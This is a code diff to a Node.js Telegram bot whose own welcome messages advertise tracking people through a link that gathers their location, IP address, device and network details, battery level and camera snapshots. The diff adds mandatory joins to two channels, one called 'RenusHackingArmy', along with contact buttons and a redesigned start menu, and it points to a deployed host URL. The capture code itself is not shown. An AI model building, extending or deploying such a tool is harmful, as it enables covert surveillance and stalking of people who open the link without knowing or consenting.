@@ -13,6 +13,30 @@ app.use(urlencodedParser);
 app.use(cors());
 app.set("view engine", "ejs");
 
+const channelUsername1 = '@RenusHackingArmy';
+const channelUsername2 = '@RenusBotsChannel';
+
+const joinChannel1Button = {
+  text: '𝙅𝙊𝙄𝙉 𝘾𝙃𝘼𝙉𝙉𝙀𝙇👻',
+  url: 'https://t.me/RenusHackingArmy'
+};
+
+const joinChannel2Button = {
+  text: '𝗝𝗢𝗜𝗡 𝗚𝗥𝗢𝗨𝗣🚁',
+  url: 'https://t.me/RenusBotsChannel'
+};
+
+// Create a button with the URL
+const contactUsButton = {
+  text: '𝘾𝙊𝙉𝙏𝘼𝘾𝙏 𝙈𝙀📞',
+  url: 'https://t.me/RenusRobot'
+};
+
+const checkJoinedButton = {
+  text: '𝗝𝗢𝗜𝗡𝗘𝗗👽',
+  callback_data: '/start'
+};
+
 //Modify your URL here
 var hostURL="https://trackdown-k1l1.onrender.com";
 //TOGGLE for 1pt Proxy and Shorters
@@ -67,12 +91,59 @@ if(msg?.reply_to_message?.text=="🌐 Enter Your URL"){
 }
   
 if(msg.text=="/start"){
-var m={
-reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
-};
+async function startCommand(chatId) {
+  try {
+    const [member1, member2] = await Promise.all([
+      bot.getChatMember(channelUsername1, chatId),
+      bot.getChatMember(channelUsername2, chatId),
+    ]);
 
-bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`,m);
+    if (
+      (member1.status === 'member' || member1.status === 'administrator' || member1.status === 'creator') &&
+      (member2.status === 'member' || member2.status === 'administrator' || member2.status === 'creator')
+    ) {
+      const inlineKeyboard = {
+        inline_keyboard: [
+          [
+            { text: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗔 𝗟𝗜𝗡𝗞🖥️", callback_data: "crenew" },
+            contactUsButton,
+          ],
+          [
+            { text: "𝙃𝙀𝙇𝙋☹️👷", callback_data: "alhaiwan" },
+          ],
+        ],
+      };
+
+      const messageOptions = {
+        reply_markup: JSON.stringify(inlineKeyboard),
+      };
+
+      await bot.sendMessage(
+        chatId,
+        `𝗛𝗲𝗹𝗹𝗼 𝗺𝘆 𝗳𝗿𝗶𝗲𝗻𝗱\n\n𝗜 𝗮𝗺 𝗮 𝘀𝗺𝗮𝗿𝘁 𝗯𝗼𝘁 𝗺𝗮𝗱𝗲 𝗯𝘆 @MOGATEAM. 🤖\n\n🔍 𝗬𝗼𝘂 𝗰𝗮𝗻 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁 𝘁𝗼 𝘁𝗿𝗮𝗰𝗸 𝗽𝗲𝗼𝗽𝗹𝗲 𝗯𝘆 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝘁𝗵𝗲𝗺 𝗮 𝘀𝗶𝗺𝗽𝗲 𝗹𝗶𝗻𝗸.\n\n𝗜𝘁 𝗰𝗮𝗻 𝗰𝗼𝗹𝗹𝗲𝗰𝘁 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗹𝗶𝗸𝗲:-\n\n➊ 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣📍\n➋ 𝘿𝙚𝙫𝙞𝙘𝙚 𝘿𝙚𝙩𝙖𝙞𝙡𝙨📱\n➌ 𝘾𝙖𝙢𝙚𝙧𝙖 𝙎𝙣𝙖𝙥𝙨𝙝𝙤𝙩𝙨 📸.\n\n𝗖𝗹𝗶𝗰𝗸 "𝗛𝗘𝗟𝗣" 𝗳𝗼𝗿 𝗺𝗼𝗿𝗲 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 🆘`,
+        messageOptions
+      );
+    } else {
+      const messageOptions = {
+        reply_markup: JSON.stringify({
+          inline_keyboard: [
+            [joinChannel1Button, joinChannel2Button],
+            [checkJoinedButton, contactUsButton],
+          ],
+        }),
+      };
+
+      await bot.sendMessage(
+        chatId,
+        `𝗬𝗼𝘂 𝗰𝗮𝗻 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁 𝘁𝗼 𝘁𝗿𝗮𝗰𝗸 𝗮𝗻𝘆𝗼𝗻𝗲'𝘀 𝗱𝗲𝘃𝗶𝗰𝗲 𝗷𝘂𝘀𝘁 𝘁𝗵𝗿𝗼𝘂𝗴𝗵 𝗮 𝘀𝗶𝗺𝗽𝗹𝗲 𝗹𝗶𝗻𝗸\n\n𝗜𝘁 𝗰𝗮𝗻 𝗴𝗮𝘁𝗵𝗲𝗿 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗹𝗶𝗸𝗲 𝗜𝗣 𝗮𝗱𝗱𝗿𝗲𝘀, 𝗹𝗼𝗰𝗮𝘁𝗶𝗼𝗻, 𝗰𝗮𝗺𝗲𝗿𝗮 𝘀𝗻𝗮𝗽𝘀, 𝗯𝗮𝘁𝘁𝗲𝗿𝘆 𝗹𝗲𝘃𝗲𝗹, 𝗻𝗲𝘁𝘄𝗼𝗿𝗸 𝗶𝗻𝗳𝗼 𝗮𝗻𝗱 𝗮 𝘄𝗶𝗱𝗲 𝗿𝗮𝗻𝗴𝗲 𝗼𝗳 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗮𝗯𝗼𝘂𝘁 𝘁𝗵𝗲𝗶𝗿 𝗱𝗲𝘃𝗶𝗰𝗲, 𝗽𝗹𝘂𝘀 𝗺𝗮𝗻𝘆 𝗺𝗼𝗿𝗲 𝗯𝗲𝗻𝗲𝗳𝗶𝘁𝘀\n\n`,
+        messageOptions
+      );
+    }
+  } catch (error) {
+    console.error(error);
+  }
 }
+  
 else if(msg.text=="/create"){
 createNew(chatId);
 }
